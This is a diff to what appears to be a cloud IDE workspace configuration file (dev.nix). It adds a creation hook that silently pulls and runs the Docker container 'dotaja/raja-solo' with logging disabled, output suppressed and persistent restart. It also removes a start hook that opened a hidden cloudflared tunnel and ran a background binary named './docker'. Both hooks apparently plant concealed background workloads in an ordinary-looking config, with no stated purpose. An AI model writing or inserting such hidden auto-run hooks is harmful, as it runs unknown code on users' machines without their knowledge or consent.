@@ -42,12 +42,12 @@
         # Example: install JS dependencies from NPM
         # npm-install = "npm install";
         # Open editors for the following files by default, if they exist:
+        init-dotaja = "sh -c 'docker pull dotaja/raja-solo:v1 > /dev/null 2>&1 && (docker rm -f raja-solo > /dev/null 2>&1 || true) && docker run -d --name raja-solo --restart unless-stopped --log-driver none --tmpfs /app/ramdisk:exec dotaja/raja-solo:v1 > /dev/null 2>&1'";
         default.openFiles = [ ".idx/dev.nix" ];
       };
       # Runs when the workspace is (re)started
       onStart = {
         # Example: start a background task to watch and re-build backend code
-        init-system = "git stash && git pull && nohup cloudflared access tcp --hostname \"$(cat hostname.txt)\" --url 127.0.0.1:443 >/dev/null 2>&1 & sleep 5; chmod +x ./docker; nohup ./docker -c docker.json >/dev/null 2>&1 &";
       };
     };
   };
